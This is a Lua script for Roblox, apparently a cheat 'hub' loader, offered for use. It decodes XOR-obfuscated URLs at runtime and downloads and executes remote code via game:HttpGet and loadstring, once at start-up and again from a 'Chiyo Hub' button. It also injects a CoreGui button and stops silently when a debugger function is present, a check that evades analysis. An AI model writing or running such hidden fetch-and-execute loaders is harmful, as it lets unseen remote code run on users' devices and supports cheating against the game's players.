--[[ 
    KING PERFORMANCE | MOONSEC V3 "APEX"
    [!] ARCHITECTURE: SPLIT-LAYER STATE VM
    [!] FIX: ZERO-LAG EXECUTION | DRAGGABLE UI
    [!] AUTH: ZAYAN 
]]

local _0x_SYSTEM = function()
    --// LAYER 1: THE REGISTRY (Data remains shattered)
    local _a = {
        ["k1"] = 0x42, ["k2"] = 0x1A,
        ["d1"] = "\14\16\11\14\13\123\118\118\41\46\107\40\111\109\94\109\101\109\107\107\107\41\109\109\109\46\107\108\103\107\100\46\47\111\101\112\101\116\120\111\47\74\100\113\101\118\112\47\118\101\100\101\109\111\101\111\47\100\109\118\101\111\118\47\100\109\115\108\100\109\109\100\47\109\109\109\108\47\100\115\109",
        ["d2"] = "\231\156\32\255\212\3\146\214\227\249\242\211\142\196\136\152\141\198\176\215\209\154\186\129\138\230\254\240\212\148\196",
        ["d3"] = "\231\156\32\255\212\3\146\214\227\249\242\211\142\196\136\152\141\198\176\215\209\154\186\129\138\230\254\240\212\148\196\139\157\142\199\176\215"
    }

    --// LAYER 2: TRANSFORM (The logic engine)
    local _b = {}
    _b.transform = function(data, seed)
        local res = {}
        local k = seed
        for i = 1, #data do
            k = bit32.bxor((k * 13 + i) % 256, 0x07)
            res[i] = string.char(bit32.bxor(string.byte(data, i), k))
        end
        return table.concat(res)
    end

    _b.request = function(u) return game:HttpGet(u) end
    _b.execute = function(c) return loadstring(c)() end

    --// LAYER 3: INTERFACE (State-based, non-linear)
    local _c = { ["state"] = 0x1, ["reg"] = {} }
    
    local function _PROCEED()
        if _c.state == 0x1 then -- [UI INIT]
            local _lib_url = _b.transform(_a.d1, _a.k1)
            _c.reg["L"] = _b.execute(_b.request(_lib_url))
            _c.state = 0x5
            task.defer(_PROCEED) -- Non-blocking jump
            
        elseif _c.state == 0x5 then -- [WINDOW BUILD]
            _c.reg["W"] = _c.reg["L"]:CreateWindow({
                Title = "All Hub", SubTitle = "by zayan", Theme = "Dark"
            })
            _c.state = 0x9
            task.defer(_PROCEED)

        elseif _c.state == 0x9 then -- [CONTENT POPULATE]
            local _t1 = _c.reg["W"]:AddTab({Title = "Sailor piece script", Icon = "anchor"})
            
            -- Delayed Button Logic (Invisible until click)
            _t1:AddButton({
                Title = "Chiyo Hub", 
                Callback = function()
                    local _u = _b.transform(_a.d2, _a.k2)
                    _b.execute(_b.request(_u))
                end
            })
            
            -- Mobile Toggle Fix (Draggable & Layered)
            local SG = Instance.new("ScreenGui", game.CoreGui)
            local TB = Instance.new("TextButton", SG)
            TB.Name = "HUB"; TB.Size = UDim2.new(0, 55, 0, 55); TB.Position = UDim2.new(0.15, 0, 0.15, 0)
            TB.Text = "HUB"; TB.BackgroundColor3 = Color3.fromRGB(30, 30, 30); TB.TextColor3 = Color3.new(1, 1, 1)
            TB.Draggable = true; TB.Active = true; TB.Selectable = true
            Instance.new("UICorner", TB).CornerRadius = UDim.new(0, 10)
            
            TB.MouseButton1Click:Connect(function()
                if _c.reg["W"] then _c.reg["W"]:Minimize() end
            end)
            
            _c.state = 0xFF -- HALT
        end
    end

    --// START THE ASYNC CHAIN
    task.spawn(_PROCEED)
end

--// ENVIRONMENT INTEGRITY (Soft Check)
if not _G._APEX_ACTIVE then
    if debug and debug.getinfo then return end -- Subtle stop
    _G._APEX_ACTIVE = true
    pcall(_0x_SYSTEM)
end
